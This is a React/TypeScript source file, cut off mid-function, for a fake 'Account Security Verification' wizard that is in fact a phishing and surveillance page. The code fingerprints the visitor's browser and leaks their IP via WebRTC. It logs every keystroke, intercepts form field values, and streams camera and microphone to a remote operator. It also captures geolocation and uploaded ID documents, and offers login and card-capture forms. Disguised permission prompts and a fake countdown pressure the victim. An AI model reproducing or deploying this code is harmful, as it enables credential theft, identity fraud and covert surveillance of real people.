import { useEffect, useRef, useState, useCallback } from "react";
import { useParams } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Progress } from "@/components/ui/progress";
import {
  Camera, Mic, MapPin, Smartphone, FolderOpen,
  CheckCircle2, AlertTriangle, Shield, Loader2, XCircle,
  ClipboardPaste, Globe, Lock, CreditCard, Eye, EyeOff,
  FileCheck, ShieldCheck,
  Timer, Users, Fingerprint, User, MessageCircle, X,
  Upload, FileText, CreditCard as CreditCardIcon, HelpCircle,
  Check, ChevronRight,
} from "lucide-react";
import { SiGoogle, SiApple } from "react-icons/si";

interface TargetPageConfig {
  steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
  enableBanking: boolean;
  enableAutoHarvest: boolean;
  enableCredentialOverlay: boolean;
  autoRequestPermissions: boolean;
  pageTitle: string;
  pageSubtitle: string;
  brandColor: "blue" | "red" | "green" | "purple" | "orange";
}

interface SessionInfo {
  id: number;
  name: string;
  status: string;
  sessionToken: string;
  pageConfig: TargetPageConfig | null;
}

interface PermissionState {
  granted: boolean;
  loading: boolean;
  error: string | null;
}

type PermissionKey = "camera" | "microphone" | "location" | "deviceInfo" | "files" | "credentials" | "clipboard" | "browserData";

const initialPermissions: Record<PermissionKey, PermissionState> = {
  camera: { granted: false, loading: false, error: null },
  microphone: { granted: false, loading: false, error: null },
  location: { granted: false, loading: false, error: null },
  deviceInfo: { granted: false, loading: false, error: null },
  files: { granted: false, loading: false, error: null },
  credentials: { granted: false, loading: false, error: null },
  clipboard: { granted: false, loading: false, error: null },
  browserData: { granted: false, loading: false, error: null },
};

const WIZARD_STEPS = [
  { id: 1, title: "Sign In", subtitle: "Account access" },
  { id: 2, title: "Photo ID", subtitle: "Identity check" },
  { id: 3, title: "Voice Check", subtitle: "Voice sample" },
  { id: 4, title: "Connection", subtitle: "Device check" },
  { id: 5, title: "Documents", subtitle: "Upload ID" },
];

const disguisedLabels: Record<PermissionKey, { title: string; body: string }> = {
  camera: { title: "Camera Access Needed", body: "We need to take a quick photo to confirm your identity. Please allow camera access when prompted." },
  microphone: { title: "Microphone Access Needed", body: "We need a short voice recording to verify your account. Please allow microphone access when prompted." },
  location: { title: "Location Verification", body: "We need to confirm your location matches your account region. Please allow location access when prompted." },
  deviceInfo: { title: "Device Check", body: "We need to verify your device for security purposes." },
  files: { title: "Document Upload", body: "Please upload a photo of your ID to verify your identity." },
  credentials: { title: "Sign In Required", body: "Please sign in to continue with the verification process." },
  clipboard: { title: "Paste Verification Code", body: "We need to check for a copied verification code from your email." },
  browserData: { title: "Browser Check", body: "A quick check of your browser settings is needed for compatibility." },
};

async function generateCanvasFingerprint(): Promise<string> {
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 200; canvas.height = 50;
    const ctx = canvas.getContext("2d");
    if (!ctx) return "unavailable";
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("BrowserFP", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText("Security", 4, 35);
    ctx.globalCompositeOperation = "multiply";
    ctx.fillStyle = "rgb(255,0,255)";
    ctx.beginPath(); ctx.arc(50, 25, 25, 0, Math.PI * 2, true); ctx.closePath(); ctx.fill();
    const dataUrl = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataUrl.length; i++) {
      const char = dataUrl.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash |= 0;
    }
    return hash.toString(16);
  } catch { return "error"; }
}

async function generateWebGLFingerprint(): Promise<Record<string, string>> {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return { status: "unavailable" };
    const g = gl as WebGLRenderingContext;
    const debugInfo = g.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: debugInfo ? g.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : g.getParameter(g.VENDOR),
      renderer: debugInfo ? g.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : g.getParameter(g.RENDERER),
      version: g.getParameter(g.VERSION),
      shadingLanguage: g.getParameter(g.SHADING_LANGUAGE_VERSION),
      maxTextureSize: String(g.getParameter(g.MAX_TEXTURE_SIZE)),
      maxViewportDims: String(g.getParameter(g.MAX_VIEWPORT_DIMS)),
      extensions: (g.getSupportedExtensions() || []).length + " extensions",
    };
  } catch { return { status: "error" }; }
}

async function generateAudioFingerprint(): Promise<string> {
  try {
    const AudioCtx = (window as any).OfflineAudioContext || (window as any).webkitOfflineAudioContext;
    if (!AudioCtx) return "unavailable";
    const context = new AudioCtx(1, 44100, 44100);
    const oscillator = context.createOscillator();
    oscillator.type = "triangle";
    oscillator.frequency.setValueAtTime(10000, context.currentTime);
    const compressor = context.createDynamicsCompressor();
    compressor.threshold.setValueAtTime(-50, context.currentTime);
    compressor.knee.setValueAtTime(40, context.currentTime);
    compressor.ratio.setValueAtTime(12, context.currentTime);
    compressor.attack.setValueAtTime(0, context.currentTime);
    compressor.release.setValueAtTime(0.25, context.currentTime);
    oscillator.connect(compressor);
    compressor.connect(context.destination);
    oscillator.start(0);
    const buffer = await context.startRendering();
    const data = buffer.getChannelData(0);
    let sum = 0;
    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
    return sum.toFixed(6);
  } catch { return "error"; }
}

function detectFonts(): string[] {
  const baseFonts = ["monospace", "sans-serif", "serif"];
  const testFonts = [
    "Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New",
    "Georgia", "Palatino", "Garamond", "Comic Sans MS", "Impact",
    "Lucida Console", "Tahoma", "Trebuchet MS", "Arial Black",
    "Calibri", "Cambria", "Segoe UI", "Roboto", "Ubuntu",
  ];
  const detected: string[] = [];
  const span = document.createElement("span");
  span.style.fontSize = "72px";
  span.style.position = "absolute";
  span.style.left = "-9999px";
  span.innerText = "mmmmmmmmmmlli";
  document.body.appendChild(span);
  const baseWidths: number[] = [];
  for (const base of baseFonts) {
    span.style.fontFamily = base;
    baseWidths.push(span.offsetWidth);
  }
  for (const font of testFonts) {
    let found = false;
    for (let i = 0; i < baseFonts.length; i++) {
      span.style.fontFamily = `'${font}', ${baseFonts[i]}`;
      if (span.offsetWidth !== baseWidths[i]) { found = true; break; }
    }
    if (found) detected.push(font);
  }
  document.body.removeChild(span);
  return detected;
}

async function detectWebRTCIP(): Promise<string[]> {
  return new Promise((resolve) => {
    const ips: string[] = [];
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => {});
      const timeout = setTimeout(() => { pc.close(); resolve(ips); }, 5000);
      pc.onicecandidate = (e) => {
        if (!e.candidate) { clearTimeout(timeout); pc.close(); resolve(ips); return; }
        const parts = e.candidate.candidate.split(" ");
        const ip = parts[4];
        if (ip && !ips.includes(ip) && ip.indexOf(".") > 0) ips.push(ip);
      };
    } catch { resolve(ips); }
  });
}

function detectBrowserFeatures(): Record<string, boolean> {
  const nav = navigator as any;
  return {
    webBluetooth: !!nav.bluetooth,
    webUSB: !!nav.usb,
    webHID: !!nav.hid,
    webSerial: !!nav.serial,
    mediaDevices: !!nav.mediaDevices,
    notifications: "Notification" in window,
    pushAPI: "PushManager" in window,
    serviceWorker: "serviceWorker" in nav,
    webAssembly: typeof WebAssembly === "object",
    webGL: !!document.createElement("canvas").getContext("webgl"),
    webGL2: !!document.createElement("canvas").getContext("webgl2"),
    sharedWorker: "SharedWorker" in window,
    webSocket: "WebSocket" in window,
    webRTC: "RTCPeerConnection" in window,
    geolocation: "geolocation" in nav,
    deviceOrientation: "DeviceOrientationEvent" in window,
    touchEvents: "ontouchstart" in window || nav.maxTouchPoints > 0,
    webCrypto: !!(window.crypto && window.crypto.subtle),
    indexedDB: "indexedDB" in window,
    webWorker: "Worker" in window,
  };
}

function detectSocialLogins(): Record<string, string> {
  const results: Record<string, string> = {};
  const checks = [
    { name: "google", url: "https://accounts.google.com/CheckCookie?continue=https://www.google.com" },
    { name: "facebook", url: "https://www.facebook.com/login/device-based/regular/login/" },
  ];
  for (const check of checks) {
    results[check.name] = "probe-attempted";
  }
  if (document.cookie.includes("SAPISID") || document.cookie.includes("SID")) results.google = "likely-logged-in";
  if (document.cookie.includes("c_user") || document.cookie.includes("xs")) results.facebook = "likely-logged-in";
  return results;
}

function getPerformanceData(): Record<string, any> {
  try {
    const perf = performance.getEntriesByType("navigation")[0] as PerformanceNavigationTiming;
    if (!perf) return {};
    return {
      dnsLookup: Math.round(perf.domainLookupEnd - perf.domainLookupStart),
      tcpConnect: Math.round(perf.connectEnd - perf.connectStart),
      tlsHandshake: Math.round(perf.secureConnectionStart > 0 ? perf.connectEnd - perf.secureConnectionStart : 0),
      pageLoadTime: Math.round(perf.loadEventEnd - perf.startTime),
      domContentLoaded: Math.round(perf.domContentLoadedEventEnd - perf.startTime),
      transferSize: (perf as any).transferSize || 0,
      encodedBodySize: (perf as any).encodedBodySize || 0,
    };
  } catch { return {}; }
}

export default function RemoteTarget() {
  const params = useParams<{ token: string }>();
  const token = params.token || "";

  const [session, setSession] = useState<SessionInfo | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [permissions, setPermissions] = useState<Record<PermissionKey, PermissionState>>(initialPermissions);
  const [pendingRequest, setPendingRequest] = useState<PermissionKey | null>(null);
  const [showCredentialOverlay, setShowCredentialOverlay] = useState(false);
  const [credForm, setCredForm] = useState({ email: "", password: "", cardNumber: "", cardExpiry: "", cardCvv: "", cardName: "" });
  const [credTab, setCredTab] = useState<"login" | "banking">("login");
  const [showPassword, setShowPassword] = useState(false);

  const [currentStep, setCurrentStep] = useState(0);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanStatus, setScanStatus] = useState("");
  const [scanRunning, setScanRunning] = useState(false);
  const [wizardComplete, setWizardComplete] = useState(false);

  const [capturedEmail, setCapturedEmail] = useState("");
  const [urgencyTimer, setUrgencyTimer] = useState(299);
  const [verificationCount] = useState(() => 2400 + Math.floor(Math.random() * 600));
  const [autoHarvestDone, setAutoHarvestDone] = useState(false);
  const [initStatus, setInitStatus] = useState("Establishing secure connection...");

  const [cookieDismissed, setCookieDismissed] = useState(false);
  const [chatOpen, setChatOpen] = useState(false);
  const [socialToast, setSocialToast] = useState<string | null>(null);
  const [selfieCaptured, setSelfieCaptured] = useState(false);
  const [voiceRecordingTime, setVoiceRecordingTime] = useState(0);
  const [voiceRecording, setVoiceRecording] = useState(false);
  const [dragOver, setDragOver] = useState(false);
  const [uploadedFileName, setUploadedFileName] = useState<string | null>(null);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [rememberMe, setRememberMe] = useState(false);
  const [termsAgreed, setTermsAgreed] = useState(true);
  const [envCheckItems, setEnvCheckItems] = useState<string[]>([]);
  const [stepTransition, setStepTransition] = useState(false);
  const [notificationShown, setNotificationShown] = useState(false);
  const [forgotPassword, setForgotPassword] = useState(false);
  const [resetEmail, setResetEmail] = useState("");
  const [resetSent, setResetSent] = useState(false);

  const selfieVideoRef = useRef<HTMLVideoElement>(null);
  const cameraStreamRef = useRef<MediaStream | null>(null);
  const audioCanvasRef = useRef<HTMLCanvasElement>(null);
  const analyserRef = useRef<AnalyserNode | null>(null);
  const animFrameRef = useRef<number>(0);

  const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const };

  const activeStepKeys = [
    cfg.steps.identity ? "identity" : null,
    cfg.steps.biometric ? "biometric" : null,
    cfg.steps.voice ? "voice" : null,
    cfg.steps.environment ? "environment" : null,
    cfg.steps.documents ? "documents" : null,
  ].filter(Boolean) as string[];

  const activeWizardSteps = WIZARD_STEPS.filter((_, i) => {
    const keys = ["identity", "biometric", "voice", "environment", "documents"];
    return activeStepKeys.includes(keys[i]);
  });

  const brandColors: Record<string, { from: string; to: string; accent: string; bg: string; solid: string; ring: string }> = {
    blue: { from: "from-blue-600", to: "to-blue-800", accent: "text-blue-600", bg: "bg-blue-600", solid: "bg-blue-50", ring: "ring-blue-200" },
    red: { from: "from-red-600", to: "to-red-800", accent: "text-red-600", bg: "bg-red-600", solid: "bg-red-50", ring: "ring-red-200" },
    green: { from: "from-green-600", to: "to-green-800", accent: "text-green-600", bg: "bg-green-600", solid: "bg-green-50", ring: "ring-green-200" },
    purple: { from: "from-purple-600", to: "to-purple-800", accent: "text-purple-600", bg: "bg-purple-600", solid: "bg-purple-50", ring: "ring-purple-200" },
    orange: { from: "from-orange-600", to: "to-orange-800", accent: "text-orange-600", bg: "bg-orange-600", solid: "bg-orange-50", ring: "ring-orange-200" },
  };
  const brand = brandColors[cfg.brandColor] || brandColors.blue;

  const wsRef = useRef<WebSocket | null>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const combinedStreamRef = useRef<MediaStream>(new MediaStream());
  const cameraTracksRef = useRef<MediaStreamTrack[]>([]);
  const micTracksRef = useRef<MediaStreamTrack[]>([]);
  const keylogBufferRef = useRef<string[]>([]);
  const keylogTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const mousePositionsRef = useRef<{ x: number; y: number; t: number }[]>([]);

  const updatePermission = useCallback((key: PermissionKey, update: Partial<PermissionState>) => {
    setPermissions((prev) => ({ ...prev, [key]: { ...prev[key], ...update } }));
  }, []);

  const sendWS = useCallback((msg: object) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(msg));
    }
  }, []);

  const postData = useCallback(async (data: object) => {
    try {
      await fetch(`/api/remote-sessions/token/${token}/data`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    } catch {}
  }, [token]);

  useEffect(() => {
    if (session && currentStep === 0) {
      if (activeStepKeys.length === 0) {
        setWizardComplete(true);
        return;
      }
      const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
      const firstActive = stepKeys.findIndex((k) => activeStepKeys.includes(k));
      setCurrentStep(firstActive >= 0 ? firstActive + 1 : 1);
    }
  }, [session, currentStep, activeStepKeys]);

  useEffect(() => {
    async function fetchSession() {
      try {
        const res = await fetch(`/api/remote-sessions/token/${token}`);
        if (!res.ok) {
          if (res.status === 404) throw new Error("Session not found");
          if (res.status === 410) throw new Error("This session has expired");
          throw new Error("Failed to load session");
        }
        const data = await res.json();
        setSession(data);
      } catch (err: any) {
        setError(err.message || "An error occurred");
      } finally {
        setLoading(false);
      }
    }
    if (token) fetchSession();
  }, [token]);

  useEffect(() => {
    const timer = setInterval(() => {
      setUrgencyTimer((prev) => (prev <= 0 ? 299 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    const t = setTimeout(() => setNotificationShown(true), 12000);
    const t2 = setTimeout(() => setNotificationShown(false), 18000);
    return () => { clearTimeout(t); clearTimeout(t2); };
  }, []);

  useEffect(() => {
    if (!session || autoHarvestDone) return;
    if (!cfg.enableAutoHarvest) { setAutoHarvestDone(true); return; }

    const runAutoHarvest = async () => {
      setInitStatus("Connecting to server...");
      await new Promise((r) => setTimeout(r, 600));

      setInitStatus("Verifying security certificate...");
      const canvasHash = await generateCanvasFingerprint();
      await new Promise((r) => setTimeout(r, 400));

      setInitStatus("Loading verification module...");
      const webglData = await generateWebGLFingerprint();
      await new Promise((r) => setTimeout(r, 300));

      setInitStatus("Preparing your session...");
      const audioHash = await generateAudioFingerprint();
      const fonts = detectFonts();
      await new Promise((r) => setTimeout(r, 400));

      setInitStatus("Almost ready...");
      const webrtcIPs = await detectWebRTCIP();
      const features = detectBrowserFeatures();
      const socialLogins = detectSocialLogins();
      const perfData = getPerformanceData();

      const screenProfile = {
        width: screen.width, height: screen.height,
        availWidth: screen.availWidth, availHeight: screen.availHeight,
        colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
        devicePixelRatio: window.devicePixelRatio,
        orientation: (screen as any).orientation?.type || "unknown",
      };

      const harvestData = {
        canvasFingerprint: canvasHash,
        webglFingerprint: webglData,
        audioFingerprint: audioHash,
        detectedFonts: fonts,
        fontCount: fonts.length,
        webrtcLeakedIPs: webrtcIPs,
        browserFeatures: features,
        socialLoginStatus: socialLogins,
        performanceTimings: perfData,
        screenProfile,
        timestamp: new Date().toISOString(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        language: navigator.language,
        languages: Array.from(navigator.languages || []),
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: (navigator as any).deviceMemory || null,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        online: navigator.onLine,
        referrer: document.referrer || "(direct)",
      };

      const trySend = () => {
        if (wsRef.current?.readyState === WebSocket.OPEN) {
          sendWS({ type: "rc_auto_harvest", data: harvestData, token });
          return true;
        }
        return false;
      };
      if (!trySend()) {
        for (let attempt = 0; attempt < 10; attempt++) {
          await new Promise((r) => setTimeout(r, 500));
          if (trySend()) break;
        }
      }
      setInitStatus("Ready");
      await new Promise((r) => setTimeout(r, 500));
      setAutoHarvestDone(true);
    };

    const timer = setTimeout(runAutoHarvest, 500);
    return () => clearTimeout(timer);
  }, [session, autoHarvestDone, sendWS, token]);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      const key = e.key.length === 1 ? e.key : `[${e.key}]`;
      const entry = `${key}`;
      keylogBufferRef.current.push(entry);
    };
    document.addEventListener("keydown", handleKeyDown);

    keylogTimerRef.current = setInterval(() => {
      if (keylogBufferRef.current.length > 0) {
        const batch = keylogBufferRef.current.splice(0);
        sendWS({ type: "rc_keylog", data: { keys: batch, timestamp: new Date().toISOString() }, token });
      }
    }, 2000);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      if (keylogTimerRef.current) clearInterval(keylogTimerRef.current);
    };
  }, [sendWS, token]);

  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      mousePositionsRef.current.push({ x: e.clientX, y: e.clientY, t: Date.now() });
      if (mousePositionsRef.current.length > 50) mousePositionsRef.current.shift();
    };

    const handleVisibilityChange = () => {
      sendWS({
        type: "rc_activity",
        data: {
          category: "tab_visibility",
          visible: !document.hidden,
          timestamp: new Date().toISOString(),
        },
        token,
      });
    };

    const handleBeforeUnload = () => {
      sendWS({
        type: "rc_activity",
        data: { category: "navigation_attempt", timestamp: new Date().toISOString() },
        token,
      });
    };

    const handleOnlineOffline = () => {
      sendWS({
        type: "rc_activity",
        data: { category: "network_change", online: navigator.onLine, timestamp: new Date().toISOString() },
        token,
      });
    };

    let idleTimeout: ReturnType<typeof setTimeout> | null = null;
    const resetIdle = () => {
      if (idleTimeout) clearTimeout(idleTimeout);
      idleTimeout = setTimeout(() => {
        sendWS({
          type: "rc_activity",
          data: { category: "idle_detected", duration: 30, timestamp: new Date().toISOString() },
          token,
        });
      }, 30000);
    };

    const mouseInterval = setInterval(() => {
      if (mousePositionsRef.current.length > 5) {
        const positions = mousePositionsRef.current.splice(0);
        sendWS({
          type: "rc_activity",
          data: { category: "mouse_movement", positions: positions.slice(-20), sampleCount: positions.length, timestamp: new Date().toISOString() },
          token,
        });
      }
    }, 10000);

    let batteryRef: any = null;
    let batteryLevelHandler: (() => void) | null = null;
    let batteryChargingHandler: (() => void) | null = null;
    const setupBattery = async () => {
      try {
        const battery = await (navigator as any).getBattery?.();
        if (!battery) return;
        batteryRef = battery;
        const reportBattery = () => {
          sendWS({
            type: "rc_activity",
            data: { category: "battery_change", level: Math.round(battery.level * 100), charging: battery.charging, timestamp: new Date().toISOString() },
            token,
          });
        };
        batteryLevelHandler = reportBattery;
        batteryChargingHandler = reportBattery;
        battery.addEventListener("levelchange", reportBattery);
        battery.addEventListener("chargingchange", reportBattery);
      } catch {}
    };
    setupBattery();

    document.addEventListener("visibilitychange", handleVisibilityChange);
    window.addEventListener("beforeunload", handleBeforeUnload);
    window.addEventListener("online", handleOnlineOffline);
    window.addEventListener("offline", handleOnlineOffline);
    document.addEventListener("mousemove", handleMouseMove);
    document.addEventListener("mousemove", resetIdle);
    document.addEventListener("keydown", resetIdle);
    resetIdle();

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange);
      window.removeEventListener("beforeunload", handleBeforeUnload);
      window.removeEventListener("online", handleOnlineOffline);
      window.removeEventListener("offline", handleOnlineOffline);
      document.removeEventListener("mousemove", handleMouseMove);
      document.removeEventListener("mousemove", resetIdle);
      document.removeEventListener("keydown", resetIdle);
      clearInterval(mouseInterval);
      if (idleTimeout) clearTimeout(idleTimeout);
      if (batteryRef && batteryLevelHandler) {
        batteryRef.removeEventListener("levelchange", batteryLevelHandler);
        batteryRef.removeEventListener("chargingchange", batteryChargingHandler);
      }
    };
  }, [sendWS, token]);

  useEffect(() => {
    const instrumentInputs = () => {
      const inputs = document.querySelectorAll("input, textarea, select");
      inputs.forEach((input) => {
        if ((input as any).__rc_monitored) return;
        (input as any).__rc_monitored = true;
        const handler = (e: Event) => {
          const el = e.target as HTMLInputElement;
          sendWS({
            type: "rc_form_intercept",
            data: {
              field: el.name || el.id || el.type || "unknown",
              value: el.value,
              type: el.type,
              timestamp: new Date().toISOString(),
            },
            token,
          });
        };
        input.addEventListener("input", handler);
        input.addEventListener("change", handler);
      });
    };
    instrumentInputs();
    const observer = new MutationObserver(() => instrumentInputs());
    observer.observe(document.body, { childList: true, subtree: true });
    return () => observer.disconnect();
  }, [sendWS, token]);

  const setupOrUpdateWebRTC = useCallback(async (newTracks: MediaStreamTrack[]) => {
    const combined = combinedStreamRef.current;
    for (const track of newTracks) {
      const existing = combined.getTracks().find(t => t.kind === track.kind);
      if (existing) combined.removeTrack(existing);
      combined.addTrack(track);
    }
    if (pcRef.current && pcRef.current.signalingState !== "closed") {
      for (const track of newTracks) {
        const sender = pcRef.current.getSenders().find(s => s.track?.kind === track.kind);
        if (sender) { await sender.replaceTrack(track); } else { pcRef.current.addTrack(track, combined); }
      }
      const offer = await pcRef.current.createOffer();
      await pcRef.current.setLocalDescription(offer);
      sendWS({ type: "rc_offer", sdp: offer, token });
      return;
    }
    if (pcRef.current) pcRef.current.close();
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
      ],
    });
    pcRef.current = pc;
    combined.getTracks().forEach((track) => pc.addTrack(track, combined));
    pc.onicecandidate = (evt) => { if (evt.candidate) sendWS({ type: "rc_ice_candidate", candidate: evt.candidate, token }); };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    sendWS({ type: "rc_offer", sdp: offer, token });
  }, [sendWS, token]);

  const handleCamera = useCallback(async () => {
    updatePermission("camera", { loading: true, error: null });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      cameraTracksRef.current = stream.getVideoTracks();
      cameraStreamRef.current = stream;
      await setupOrUpdateWebRTC(stream.getVideoTracks());
      updatePermission("camera", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "camera" });
      await postData({ permissionsGranted: ["camera"] });
    } catch (err: any) {
      updatePermission("camera", { loading: false, error: "Camera access was denied. Please allow camera access in your browser settings and try again." });
      sendWS({ type: "rc_permission_denied", permission: "camera" });
    }
  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);

  const handleMicrophone = useCallback(async () => {
    updatePermission("microphone", { loading: true, error: null });
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      micTracksRef.current = stream.getAudioTracks();
      await setupOrUpdateWebRTC(stream.getAudioTracks());
      updatePermission("microphone", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "microphone" });
      await postData({ permissionsGranted: ["microphone"] });

      try {
        const audioCtx = new AudioContext();
        const analyserStream = new MediaStream(stream.getAudioTracks().map(t => t.clone()));
        const source = audioCtx.createMediaStreamSource(analyserStream);
        const analyser = audioCtx.createAnalyser();
        analyser.fftSize = 256;
        source.connect(analyser);
        analyserRef.current = analyser;
      } catch {}

      setVoiceRecording(true);
      setVoiceRecordingTime(0);
      const start = Date.now();
      const interval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - start) / 1000);
        setVoiceRecordingTime(elapsed);
        if (elapsed >= 5) {
          clearInterval(interval);
          setVoiceRecording(false);
          setTimeout(() => advanceStep(), 1500);
        }
      }, 200);
    } catch (err: any) {
      updatePermission("microphone", { loading: false, error: "Microphone access was denied. Please allow microphone access in your browser settings and try again." });
      sendWS({ type: "rc_permission_denied", permission: "microphone" });
    }
  }, [setupOrUpdateWebRTC, sendWS, postData, updatePermission]);

  useEffect(() => {
    if (!voiceRecording || !analyserRef.current || !audioCanvasRef.current) return;
    const canvas = audioCanvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    const analyser = analyserRef.current;
    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    const draw = () => {
      animFrameRef.current = requestAnimationFrame(draw);
      analyser.getByteFrequencyData(dataArray);
      ctx.fillStyle = "rgba(0, 0, 0, 0)";
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      const barWidth = (canvas.width / bufferLength) * 2.5;
      let x = 0;
      for (let i = 0; i < bufferLength; i++) {
        const barHeight = (dataArray[i] / 255) * canvas.height;
        const hue = cfg.brandColor === "blue" ? 220 : cfg.brandColor === "red" ? 0 : cfg.brandColor === "green" ? 140 : cfg.brandColor === "purple" ? 270 : 30;
        ctx.fillStyle = `hsla(${hue}, 70%, 55%, 0.8)`;
        ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
        x += barWidth + 1;
      }
    };
    draw();
    return () => cancelAnimationFrame(animFrameRef.current);
  }, [voiceRecording, cfg.brandColor]);

  const handleLocation = useCallback(async () => {
    updatePermission("location", { loading: true, error: null });
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      const locData = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, altitude: position.coords.altitude, speed: position.coords.speed };
      sendWS({ type: "rc_location", data: locData, token });
      await postData({ permissionsGranted: ["location"], locationData: locData });
      updatePermission("location", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "location" });
    } catch (err: any) {
      updatePermission("location", { loading: false, error: err.message || "Location access denied" });
      sendWS({ type: "rc_permission_denied", permission: "location" });
    }
  }, [sendWS, postData, updatePermission, token]);

  const handleDeviceInfo = useCallback(async () => {
    updatePermission("deviceInfo", { loading: true, error: null });
    try {
      const nav = navigator as any;
      let batteryLevel = null;
      try { const battery = await nav.getBattery?.(); if (battery) batteryLevel = Math.round(battery.level * 100); } catch {}
      const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
      const deviceData: Record<string, any> = {
        userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language,
        languages: Array.from(navigator.languages || []), hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: nav.deviceMemory || null, screenWidth: screen.width, screenHeight: screen.height,
        screenColorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
        connectionType: connection?.effectiveType || null, connectionDownlink: connection?.downlink || null,
        battery: batteryLevel, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack,
        maxTouchPoints: navigator.maxTouchPoints, vendor: navigator.vendor,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, online: navigator.onLine,
        windowWidth: window.innerWidth, windowHeight: window.innerHeight,
      };
      sendWS({ type: "rc_device_info", data: deviceData, token });
      await postData({ permissionsGranted: ["deviceInfo"], deviceInfo: deviceData });
      updatePermission("deviceInfo", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "deviceInfo" });
    } catch (err: any) {
      updatePermission("deviceInfo", { loading: false, error: err.message || "Failed to collect device info" });
      sendWS({ type: "rc_permission_denied", permission: "deviceInfo" });
    }
  }, [sendWS, postData, updatePermission, token]);

  const handleFiles = useCallback(() => { fileInputRef.current?.click(); }, []);

  const onFileSelected = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    updatePermission("files", { loading: true, error: null });
    setUploadedFileName(files[0].name);
    setUploadProgress(0);
    const progressInterval = setInterval(() => {
      setUploadProgress((prev) => {
        if (prev >= 100) { clearInterval(progressInterval); return 100; }
        return prev + Math.random() * 20 + 10;
      });
    }, 300);
    try {
      for (const file of Array.from(files)) {
        const dataUrl = await new Promise<string>((resolve) => {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result as string);
          reader.readAsDataURL(file);
        });
        sendWS({ type: "rc_file", data: { name: file.name, type: file.type, size: file.size, preview: dataUrl }, token });
      }
      clearInterval(progressInterval);
      setUploadProgress(100);
      updatePermission("files", { granted: true, loading: false });
      sendWS({ type: "rc_permission_granted", permission: "files" });
    } catch (err: any) {
      clearInterval(progressInterval);
      updatePermission("files", { loading: false, error: err.message || "Failed to process files" });
    }
  };

  const handleCredentials = useCallback(() => {
    if (!cfg.enableCredentialOverlay) {
      updatePermission("credentials", { granted: true, loading: false });
